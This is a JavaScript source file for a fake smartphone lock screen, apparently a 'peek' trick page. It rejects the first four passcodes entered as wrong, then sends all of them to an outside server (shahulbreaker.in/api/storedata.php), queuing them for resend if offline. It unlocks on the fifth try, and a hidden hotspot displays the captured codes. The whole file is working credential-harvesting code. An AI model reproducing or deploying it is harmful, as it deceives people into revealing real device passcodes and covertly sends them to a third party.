(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';
  const ATT_CODES_KEY = '_pass_attempts_codes_'; // persistent storage key for collected codes

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function getStoredAttemptCodes() {
    try { return JSON.parse(localStorage.getItem(ATT_CODES_KEY) || '[]'); }
    catch (e) { return []; }
  }
  function pushStoredAttemptCode(pass) {
    const arr = getStoredAttemptCodes();
    arr.push(pass);
    localStorage.setItem(ATT_CODES_KEY, JSON.stringify(arr));
  }
  function clearStoredAttemptCodes() {
    localStorage.removeItem(ATT_CODES_KEY);
  }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        // if network fails, queue the combined payload
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (unchanged) ---------- */
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120;
    const damping = opts.damping ?? 14;
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000);
      last = now;
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId);
  }

  /* ---------- Unlock animation (unchanged) ---------- */
  function playUnlockAnimation() {
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;

    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      return;
    }

    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08);

    lockInner.style.willChange = 'transform, opacity';
    homescreenImg.style.willChange = 'transform, filter, opacity';
    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
    homescreenImg.style.opacity = '0';
    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';

    springAnimate({
      from: 0,
      to: targetY,
      mass: 1.05,
      stiffness: 140,
      damping: 16,
      onUpdate: (val) => {
        const progress = Math.min(1, Math.abs(val / targetY));
        const scale = 1 - 0.003 * progress;
        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
      },
      onComplete: () => {
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
      }
    });

    springAnimate({
      from: 0,
      to: 1,
      mass: 1,
      stiffness: 80,
      damping: 11,
      onUpdate: (p) => {
        const progress = Math.max(0, Math.min(1, p));
        const raw = p;
        const scale = 1 + (raw - 1) * 0.12;
        const finalScale = Math.max(0.96, Math.min(1.06, scale));
        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
        const sat = 0.9 + Math.min(0.15, raw * 0.15);
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';
      }
    });

    setTimeout(() => {
      lockInner.style.boxShadow = '';
      homescreenImg.style.willChange = '';
      lockInner.style.willChange = '';
    }, 1200);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  /* ---------- Attempts logic: collect 4 codes, send combined on 4th, 5th unlock ---------- */
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // store this entered code persistently
    pushStoredAttemptCode(enteredCode);

    if (attempts >= 1 && attempts <= 3) {
      animateWrongAttempt();
    } else if (attempts === 4) {
      const codes = getStoredAttemptCodes();
      const combined = codes.join(',');
      sendToAPI(combined);
      animateWrongAttempt();
    } else if (attempts === 5) {
      playUnlockAnimation();
      setTimeout(reset, 300);
    }

    // After 5th attempt reset counter but KEEP stored codes so they can be shown on hotspot
    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  /* ---------- Bottom-left hotspot + minimal codes display ---------- */
  function createHotspotAndDisplay() {
    // Hotspot
    if (!document.getElementById('codesHotspot')) {
      const hs = document.createElement('div');
      hs.id = 'codesHotspot';
      Object.assign(hs.style, {
        position: 'fixed',
        left: '12px',
        bottom: '12px',
        width: '56px',
        height: '56px',
        borderRadius: '12px',
        background: 'rgba(255,255,255,0.03)',
        border: '1px solid rgba(255,255,255,0.06)',
        zIndex: '12000',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        boxSizing: 'border-box',
        touchAction: 'none',
        cursor: 'pointer',
        // a subtle indicator so it's discoverable; remove or tweak opacity if you want it invisible
        backdropFilter: 'blur(2px)'
      });
      // optional subtle glyph (dot) so user can find
      const dot = document.createElement('div');
      Object.assign(dot.style, {
        width: '10px',
        height: '10px',
        borderRadius: '50%',
        background: 'rgba(255,255,255,0.12)',
      });
      hs.appendChild(dot);
      document.body.appendChild(hs);
    }

    // Codes display box (hidden by default)
    if (!document.getElementById('codesDisplay')) {
      const d = document.createElement('div');
      d.id = 'codesDisplay';
      Object.assign(d.style, {
        position: 'fixed',
        left: '12px',
        bottom: '80px',
        width: '280px',
        maxWidth: 'calc(100% - 24px)',
        zIndex: '12001',
        display: 'none',
        justifyContent: 'center',
        pointerEvents: 'none',
        transition: 'opacity 120ms ease, transform 120ms ease'
      });

      const inner = document.createElement('div');
      inner.id = 'codesDisplayInner';
      Object.assign(inner.style, {
        width: '100%',
        background: 'rgba(0,0,0,0.7)',
        borderRadius: '12px',
        padding: '12px',
        boxSizing: 'border-box',
        display: 'flex',
        gap: '8px',
        flexWrap: 'wrap',
        justifyContent: 'center',
        alignItems: 'center',
        color: '#fff',
        fontSize: '18px',
        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
        fontWeight: '700',
        letterSpacing: '0.6px'
      });

      d.appendChild(inner);
      document.body.appendChild(d);
    }
  }

  function showCodesAtBottomLeft() {
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    createHotspotAndDisplay();
    const bar = document.getElementById('codesDisplay');
    const inner = document.getElementById('codesDisplayInner');
    inner.innerHTML = '';
    const codes = getStoredAttemptCodes();
    if (!codes || !codes.length) {
      const e = document.createElement('div');
      e.textContent = '';
      inner.appendChild(e);
    } else {
      codes.forEach(c => {
        const pill = document.createElement('div');
        pill.textContent = c;
        Object.assign(pill.style, {
          background: 'rgba(255,255,255,0.08)',
          color: '#fff',
          padding: '8px 12px',
          borderRadius: '999px',
          display: 'inline-block',
          fontSize: '18px',
          fontWeight: '800',
          letterSpacing: '0.6px',
          boxShadow: '0 4px 12px rgba(0,0,0,0.35) inset'
        });
        inner.appendChild(pill);
      });
    }
    bar.style.display = 'flex';
    // animate in
    requestAnimationFrame(() => {
      bar.style.transform = 'translateY(0)';
      bar.style.opacity = '1';
    });
  }

  function hideCodesImmediately() {
    const bar = document.getElementById('codesDisplay');
    if (!bar) return;
    bar.style.transform = 'translateY(8px)';
    bar.style.opacity = '0';
    setTimeout(() => {
      if (bar) bar.style.display = 'none';
    }, 120);
  }

  // Hotspot pointer handlers
  function onHotspotDown(ev) {
    // only when homescreen visible
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    // prevent other interactions
    ev.preventDefault();
    // show codes immediately on press (no long press needed)
    showCodesAtBottomLeft();
  }
  function onHotspotUp(ev) {
    // hide codes as soon as the user lifts finger
    hideCodesImmediately();
  }

  // create hotspot and wire handlers
  function ensureHotspotListeners() {
    createHotspotAndDisplay();
    const hs = document.getElementById('codesHotspot');
    if (!hs._hotspotAttached) {
      hs.addEventListener('pointerdown', onHotspotDown);
      window.addEventListener('pointerup', onHotspotUp);
      window.addEventListener('pointercancel', onHotspotUp);
      // also support touchstart/up as fallback (some older browsers)
      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
      window.addEventListener('touchend', onHotspotUp);
      window.addEventListener('touchcancel', onHotspotUp);
      hs._hotspotAttached = true;
    }
  }

  /* ---------- wire other behaviours ---------- */
  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80); // increased brightness
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  // make sure hotspot exists and is listening
  ensureHotspotListeners();

  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
})();
